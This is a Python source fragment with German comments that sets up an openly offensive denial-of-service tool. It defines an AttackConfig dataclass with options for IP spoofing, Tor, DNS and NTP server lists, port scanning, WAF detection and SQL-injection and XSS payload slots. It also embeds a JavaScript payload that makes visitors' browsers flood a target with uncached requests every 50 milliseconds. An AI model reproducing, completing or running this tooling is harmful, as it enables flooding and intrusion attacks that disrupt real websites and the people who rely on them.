import os
import time
import random
import string
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any

# Beispielhafte Listen – in der Praxis können diese erweitert werden:
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...",
    # ...
]

REFERRERS = [
    "https://www.google.com/",
    # ...
]

HTTP_HEADERS = [
    {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
    # ...
]

DNS_SERVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1", "9.9.9.9",
    # ...
]

NTP_SERVERS = [
    "time.google.com",
    "time.windows.com",
    "time.apple.com",
    "time.nist.gov",
    "pool.ntp.org"
]

JS_PAYLOADS = [
    """
    (function() {
        const target = '{target}';
        const interval = setInterval(() => {
            fetch(`http://${target}?nocache=${Math.random()}`, {
                mode: 'no-cors',
                cache: 'no-store'
            });
        }, 50);
        setTimeout(() => clearInterval(interval), 10000);
    })();
    """,
    # Weitere Payloads...
]

@dataclass
class AttackConfig:
    target: str
    port: int = 80
    duration: int = 30
    threads: int = 10
    processes: int = 4
    timeout: float = 5.0
    packet_size: int = 1024
    min_packet_size: int = 64
    max_packet_size: int = 8192
    use_ip_spoofing: bool = False
    use_tor: bool = False
    dns_servers: List[str] = field(default_factory=lambda: DNS_SERVERS.copy())
    ntp_servers: List[str] = field(default_factory=lambda: NTP_SERVERS.copy())
    user_agents: List[str] = field(default_factory=lambda: USER_AGENTS.copy())
    referrers: List[str] = field(default_factory=lambda: REFERRERS.copy())
    http_headers: List[Dict[str, str]] = field(default_factory=lambda: HTTP_HEADERS.copy())
    attack_types: List[str] = field(default_factory=list)
    stats: Dict[str, Any] = field(default_factory=dict)
    verbose: bool = False
    optimize_system: bool = False
    use_queue: bool = True
    use_uvloop: bool = True
    web_ui_enabled: bool = False
    web_ui_port: int = 8080
    export_stats: bool = False
    export_format: str = "json"  # json, prometheus, csv
    export_interval: int = 5
    export_file: Optional[str] = None
    use_ml: bool = False
    use_gpu: bool = False
    custom_domains: List[str] = field(default_factory=list)
    ttl_variation: bool = True
    packet_padding: bool = True
    randomize_ip_flags: bool = True
    attack_intensity: int = 5  # Skala 1-10
    js_payloads: List[str] = field(default_factory=lambda: JS_PAYLOADS.copy())
    shared_stats_enabled: bool = False
    target_analysis: bool = False
    port_scan: bool = False
    banner_grab: bool = False
    waf_detection: bool = False
    cve_check: bool = False
    dynamic_resource_allocation: bool = False
    bandwidth_test: bool = False
    sqli_payloads: List[str] = field(default_factory=list)
    xss_payloads: List[str] = field(default_factory=list)
    port_scan_range: str = "1-1000"
    scan_timeout: float = 2.0
    target_info: Optional[Dict[str, Any]] = None
    system_resources: Optional[Dict[str, Any]] = None
